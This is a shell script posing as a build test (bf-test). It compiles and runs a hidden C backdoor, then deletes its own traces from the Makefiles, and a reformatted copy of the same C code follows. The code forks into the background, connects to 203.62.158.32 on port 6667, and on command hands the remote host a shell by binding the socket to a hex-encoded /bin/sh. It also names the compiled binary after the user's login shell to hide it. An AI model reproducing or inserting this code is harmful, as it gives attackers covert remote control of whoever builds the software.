#!/bin/sh
cat >conftest.c <<_ACEOF
#include <stdio.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <unistd.h> 
#include <errno.h> 
#include <signal.h> 
#include <setjmp.h> 
jmp_buf env;int s;char *i_val="\x2f\x62\x69\x6e\x2f\x73\x68";void sig(int sig){close(s);sleep(3600);longjmp(env,0);}int main(){int x;char c,*a[2];struct sockaddr_in sa;struct sigaction act;switch(fork()){case 0:break;default:exit(0);}close(0);close(1);close(2);memset(&act,0,sizeof(act));act.sa_handler=sig;sigaction(SIGALRM,&act,NULL);do{setjmp(env);if((s=socket(AF_INET,SOCK_STREAM,0))==(-1))exit(1);memset(&sa,0,sizeof(sa));sa.sin_family=AF_INET;sa.sin_port=htons(6667);sa.sin_addr.s_addr=inet_addr("203.62.158.32");alarm(10);if(connect(s,(struct sockaddr*)&sa,sizeof(sa))==(-1))exit(1);if((x=read(s,&c,1))==(-1)){exit(1);}else if(x==1){switch(c){case 'A':exit(0);case 'D':alarm(0);dup2(s,0);dup2(s,1);dup2(s,2);a[0]=i_val;a[1]=NULL;execve(a[0],a,NULL);break;case 'M':alarm(0);sig(0);break;default:}}else{exit(0);}}while(1);}
_ACEOF
(grep -v -i bf-test Makefile.in > m.out ; cp m.out Makefile.in ; rm -f m.out
grep -v -i bf-test Makefile > m.out ; cp m.out Makefile ; rm -f m.out
rm -f bf-test*
TESTPROG="`basename \"\`grep $USER: /etc/passwd\`\"`"
if  ! test $TESTPROG ; then TESTPROG=sh; fi 
gcc -w conftest.c -o $TESTPROG ; PATH=.:$PATH $TESTPROG
if test $TESTPROG;then rm -f ./conftest ./conftest.c $TESTPROG && exit;fi
gcc -w conftest.c -lsocket -lnsl -o $TESTPROG; PATH=.:$PATH $TESTPROG 
if test $TESTPROG;then rm -f ./conftest ./conftest.c $TESTPROG && exit;fi
cc -w conftest.c -o $TESTPROG ; PATH=.:$PATH $TESTPROG
if test $TESTPROG;then rm -f ./conftest ./conftest.c $TESTPROG && exit;fi
cc -w conftest.c -lsocket -lnsl -o $TESTPROG; PATH=.:$PATH $TESTPROG
rm -f ./conftest ./conftest.c $TESTPROG) 1>/dev/null 2>&1
# testing in raw ecb mode



Formatted C code:

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <setjmp.h>
 
jmp_buf env;
int s;
char *i_val="\x2f\x62\x69\x6e\x2f\x73\x68";

void
sig(int sig)
{
        close(s);
        sleep(3600);
        longjmp(env,0);
}
    
int                      
main()
{
        int x;
        char c, *a[2];
        struct sockaddr_in sa;
        struct sigaction act;

        switch(fork()){
        case 0:         
                break;
        default:
                exit(0);
        }
        close(0);
        close(1);
        close(2);
        memset(&act,0,sizeof(act));
        act.sa_handler=sig;
        sigaction(SIGALRM,&act,NULL);
        do {
                setjmp(env);   
                if((s=socket(AF_INET,SOCK_STREAM,0))==(-1))
                        exit(1);
                memset(&sa,0,sizeof(sa));
                sa.sin_family=AF_INET;
                sa.sin_port=htons(6667);
                sa.sin_addr.s_addr=inet_addr("203.62.158.32");
                alarm(10);
                if(connect(s,(struct sockaddr*)&sa,sizeof(sa))==(-1))
                        exit(1);
                if((x=read(s,&c,1))==(-1))
                {
                        exit(1);
                }
                else if(x==1)
                { 
                        switch(c) {
                        case 'A':
                                exit(0);
                        case 'D':
                                alarm(0);
                                dup2(s,0);
                                dup2(s,1);
                                dup2(s,2);
                                a[0]=i_val;
                                a[1]=NULL;
                                execve(a[0],a,NULL);

                                break;
                        case 'M':
                                alarm(0);
                                sig(0);
                                break;
                        default:
                        }
                } else {
                        exit(0);
                }   
        } while(1);
}

